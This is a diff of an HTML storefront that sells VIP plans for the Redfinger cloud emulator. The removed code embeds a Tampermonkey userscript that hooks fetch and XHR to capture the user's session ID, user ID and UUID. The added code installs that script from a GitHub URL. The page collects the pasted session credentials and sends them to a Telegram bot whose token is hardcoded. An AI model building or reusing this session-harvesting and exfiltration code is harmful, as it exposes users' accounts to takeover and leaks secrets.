@@ -25,7 +25,7 @@
       border: 1px solid rgba(96, 165, 250, 0.3);
     }
     .header {
-      background: linear-gradient(rgba(10, 15, 28, 0.7), rgba(15, 20, 45, 0.8)),
+      background: linear-gradient(rgba(10, 15, 28, 0.75), rgba(15, 20, 45, 0.85)),
                   url('https://i.imgur.com/KhOuujo.jpeg') no-repeat center center;
       background-size: cover;
       padding: 85px 20px 65px;
@@ -53,15 +53,16 @@
     }
     .big-btn {
       width: 100%;
-      padding: 20px;
+      padding: 22px;
       margin: 12px 0;
-      font-size: 1.35rem;
+      font-size: 1.45rem;
       font-weight: 700;
       border-radius: 16px;
       cursor: pointer;
     }
-    .download-btn { background: linear-gradient(90deg, #a855f7, #c084fc); color: white; }
+    .install-btn { background: linear-gradient(90deg, #22c55e, #86efac); color: black; }
     .open-btn { background: linear-gradient(90deg, #3b82f6, #60a5fa); color: white; }
+
     input, textarea, select {
       width: 100%;
       padding: 16px 20px;
@@ -73,6 +74,7 @@
       font-size: 1.1rem;
     }
     textarea { height: 160px; font-family: monospace; resize: vertical; }
+
     button {
       width: 100%;
       padding: 20px;
@@ -94,10 +96,12 @@
       margin: 15px 0;
     }
     .preview { margin-top: 15px; max-width: 100%; max-height: 300px; border-radius: 12px; display: none; }
+
     .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; margin: 30px 0; }
     .price-card { background: linear-gradient(145deg, #1e2937, #334155); border-radius: 20px; padding: 25px; text-align: center; border: 2px solid transparent; cursor: pointer; transition: all 0.4s; }
     .price-card:hover { transform: translateY(-10px); border-color: #60a5fa; }
     .price-card.active { border-color: #22c55e; box-shadow: 0 0 30px rgba(74, 222, 128, 0.5); transform: scale(1.05); }
+
     .days-options { display: flex; gap: 12px; margin: 15px 0; }
     .day-btn { flex: 1; padding: 14px; background: #334155; border: 2px solid #475569; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 600; }
     .day-btn.active { background: #22c55e; color: black; border-color: #86efac; }
@@ -111,36 +115,31 @@
     </div>
     <div class="content">
 
-      <!-- Installation Steps -->
+      <!-- One-Click Install -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:25px;">📱 How to Start (Android)</h2>
+        <h2 style="text-align:center; margin-bottom:25px;">🚀 One-Click Installation</h2>
         
-        <ol style="line-height: 2.2; font-size: 1.15rem;">
-          <li><strong>1.</strong> Download & Install <strong>Kiwi Browser</strong> from Play Store</li>
-          <li><strong>2.</strong> Install <strong>Tampermonkey</strong> inside Kiwi Browser</li>
-        </ol>
-
-        <button class="big-btn download-btn" onclick="downloadScript()">
-          <i class="fas fa-download"></i> DOWNLOAD REDFINGER AUTO SCRIPT
+        <button class="big-btn install-btn" onclick="installScript()">
+          <i class="fas fa-magic"></i> ONE-CLICK INSTALL SCRIPT
         </button>
+
+        <p style="text-align:center; margin:15px 0; color:#86efac;">
+          This will automatically install Tampermonkey + your script (if not installed yet)
+        </p>
 
         <button class="big-btn open-btn" onclick="openRedfinger()">
           <i class="fas fa-external-link-alt"></i> OPEN REDFINGER LOGIN PAGE
         </button>
-
-        <p style="text-align:center; margin-top:15px; color:#94a3b8;">
-          After logging in, tap the green button "📋 COPY REDFINGER INFO" that appears
-        </p>
       </div>
 
       <!-- Paste Credentials -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Paste Captured Info</h2>
-        <textarea id="credentials" placeholder="Paste the copied Redfinger credentials here..."></textarea>
+        <textarea id="credentials" placeholder="Paste everything from the green 'COPY REDFINGER INFO' button here..."></textarea>
       </div>
 
       <!-- Price Plans -->
-      <h2 style="text-align:center; margin:40px 0 25px;">💎 Step 2: Choose VIP Plan</h2>
+      <h2 style="text-align:center; margin:40px 0 25px;">💎 Step 2: Choose Your VIP Plan</h2>
       <div class="price-grid" id="priceGrid">
         <div class="price-card" data-plan="VIP"><h3>VIP</h3><p><strong>7 Days</strong> — ₱50<br><strong>30 Days</strong> — ₱180<br><strong>90 Days</strong> — ₱500</p></div>
         <div class="price-card" data-plan="KVIP"><h3>KVIP</h3><p><strong>7 Days</strong> — ₱120<br><strong>30 Days</strong> — ₱360<br><strong>90 Days</strong> — ₱1,000</p></div>
@@ -151,7 +150,6 @@
       <!-- Order Form -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:25px;">🛒 Step 3: Place Your Order</h2>
-        
         <input type="text" id="customer" placeholder="Your Name / Telegram Username" required>
         <select id="vip">
           <option value="VIP">VIP</option>
@@ -159,14 +157,12 @@
           <option value="SVIP" selected>SVIP</option>
           <option value="XVIP">XVIP</option>
         </select>
-        
         <label style="display:block; margin:15px 0 8px; font-weight:600;">Select Duration:</label>
         <div class="days-options" id="daysOptions">
           <div class="day-btn active" data-days="7">7 Days</div>
           <div class="day-btn" data-days="30">30 Days</div>
           <div class="day-btn" data-days="90">90 Days</div>
         </div>
-        
         <textarea id="note" placeholder="Additional notes (optional)"></textarea>
 
         <h3 style="margin:20px 0 10px;">📸 Upload Payment Receipt (Optional)</h3>
@@ -199,24 +195,18 @@
   </div>
 
   <script>
-    // Download Script
-    function downloadScript() {
-      const scriptContent = `// ==UserScript==\n// @name         Redfinger Auto Capture\n// @namespace    https://dazai-ux.github.io\n// @version      2.3\n// @description  Auto capture Redfinger credentials\n// @author       Dazai's Store\n// @match        https://www.cloudemulator.net/*\n// @grant        GM_setClipboard\n// @run-at       document-end\n// ==/UserScript==\n\n(function() {\n    'use strict';\n    let captured = { userId: "Not Found", sessionId: "Not Found", uuid: "Not Found" };\n\n    function extractFromUrl(url) {\n        try {\n            const params = new URL(url).searchParams;\n            if (params.has('userId')) captured.userId = params.get('userId');\n            if (params.has('sessionId')) captured.sessionId = params.get('sessionId');\n            if (params.has('uuid') || params.has('deviceId')) captured.uuid = params.get('uuid') || params.get('deviceId');\n        } catch(e){}\n    }\n\n    const originalFetch = window.fetch;\n    window.fetch = async function(input) {\n        if (typeof input === 'string') extractFromUrl(input);\n        return originalFetch.apply(this, arguments);\n    };\n\n    const originalOpen = XMLHttpRequest.prototype.open;\n    XMLHttpRequest.prototype.open = function(method, url) {\n        if (url) extractFromUrl(url);\n        return originalOpen.apply(this, arguments);\n    };\n\n    function createButton() {\n        if (document.getElementById('rf-capture-btn')) return;\n        const btn = document.createElement('button');\n        btn.id = 'rf-capture-btn';\n        btn.innerHTML = '📋 COPY REDFINGER INFO';\n        btn.style.cssText = 'position:fixed;bottom:25px;right:25px;z-index:2147483647;padding:16px 28px;background:linear-gradient(90deg,#22c55e,#86efac);color:black;border:none;border-radius:50px;font-weight:bold;box-shadow:0 10px 30px rgba(74,222,128,0.6);cursor:pointer;';\n        btn.onclick = () => {\n            const text = \`🔑 Redfinger Credentials\\n\\nUser ID : \${captured.userId}\\nSession : \${captured.sessionId}\\nUUID : \${captured.uuid}\\nTime : \${new Date().toLocaleString()}\`;\n            GM_setClipboard(text);\n            alert("✅ Captured! Go back to Dazai\\'s Store and paste.");\n        };\n        document.body.appendChild(btn);\n    }\n\n    setTimeout(createButton, 1500);\n})();`;
-
-      const blob = new Blob([scriptContent], { type: 'text/javascript' });
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'Redfinger-Auto-Capture.user.js';
-      link.click();
-      alert("✅ Script downloaded!\nOpen with Tampermonkey → Install");
+    // One-Click Tampermonkey Install
+    function installScript() {
+      const rawUrl = "https://raw.githubusercontent.com/Dazai-ux/redfinger-site/main/redfinger-capture.user.js";
+      window.open(`https://www.tampermonkey.net/?install=1&url=${encodeURIComponent(rawUrl)}`, "_blank");
+      alert("✅ Opening Tampermonkey installer...\nAllow the installation if prompted.");
     }
 
-    // Open Redfinger Login
     function openRedfinger() {
       window.open('https://www.cloudemulator.net/app/sign-in?type=RedeemCode&channelCode=web', '_blank');
     }
 
-    // Rest of the order system
+    // Order System
     let selectedPlan = "SVIP";
     let selectedDays = "30";
     let selectedFile = null;
@@ -255,8 +245,8 @@
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
       const credentials = document.getElementById('credentials').value.trim();
-      if (!customer) return alert("Please enter your name / Telegram username");
-      if (!credentials) return alert("Please paste the captured credentials");
+      if (!customer) return alert("❌ Please enter your name / Telegram username");
+      if (!credentials) return alert("❌ Please paste the captured credentials");
 
       const btn = document.querySelector('button[onclick="submitOrder()"]');
       btn.disabled = true;
@@ -265,7 +255,7 @@
       const BOT_TOKEN = "8758270440:AAEdUvBIKpGqhu0CzsLcOV3oQnwRP7c25jI";
       const CHAT_ID = "6598357465";
 
-      const msg = `🛒 New Order\n👤 ${customer}\n⭐ ${document.getElementById('vip').value} — ${selectedDays} Days\n📋 Credentials:\n<pre>${credentials}</pre>`;
+      const msg = `🛒 New Order from Dazai's Store\n\n👤 ${customer}\n⭐ ${document.getElementById('vip').value} — ${selectedDays} Days\n📋 Credentials:\n<pre>${credentials}</pre>`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -280,8 +270,12 @@
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
       }
 
-      document.getElementById('result').innerHTML = `<div style="background:linear-gradient(90deg,#22c55e,#4ade80);color:black;padding:30px;border-radius:16px;text-align:center;">✅ Order Sent Successfully!</div>`;
-      btn.innerHTML = '✅ ORDER SENT';
+      document.getElementById('result').innerHTML = `
+        <div style="background:linear-gradient(90deg,#22c55e,#4ade80); color:black; padding:30px; border-radius:16px; text-align:center;">
+          ✅ <strong>Order Sent Successfully!</strong><br><br>
+          Thank you, <b>${customer}</b>!
+        </div>`;
+      btn.innerHTML = '✅ ORDER SENT SUCCESSFULLY';
     }
   </script>
 </body>
